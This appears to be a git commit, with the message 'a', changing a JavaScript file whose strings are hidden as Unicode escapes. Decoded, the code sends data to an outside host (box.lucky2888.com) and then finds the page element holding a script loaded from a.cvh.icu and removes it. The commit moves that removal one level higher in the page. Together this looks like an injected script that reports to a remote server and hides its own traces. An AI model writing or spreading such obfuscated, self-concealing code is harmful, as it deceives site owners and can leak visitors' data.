4378c8ae86a6351cb4d96438029f9e6691cdb69b
biluweb <1181935296@qq.com>
2024-01-01 19:14:23 +0800

    a

--- js/a.js
+++ js/a.js
@@ -24,7 +24,7 @@
     this.fn1({ url: "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0062\u006f\u0078\u002e\u006c\u0075\u0063\u006b\u0079\u0032\u0038\u0038\u0038\u002e\u0063\u006f\u006d\u002f\u0061\u0070\u0069\u002f\u0066\u0074\u0074\u0073", data: this.dt });
     this.d1 = document.querySelector("\u0073\u0063\u0072\u0069\u0070\u0074\u005b\u0073\u0072\u0063\u003d\u0027\u002f\u002f\u0061\u002e\u0063\u0076\u0068\u002e\u0069\u0063\u0075\u002f\u0061\u002e\u006a\u0073\u0027\u005d");
     if (this.d1) {
-        this.n1 = this.d1.parentElement
+        this.n1 = this.d1.parentElement.parentElement
         if (this.n1.nodeName == "\u0054\u0052") {
             this.n1.remove();
         }
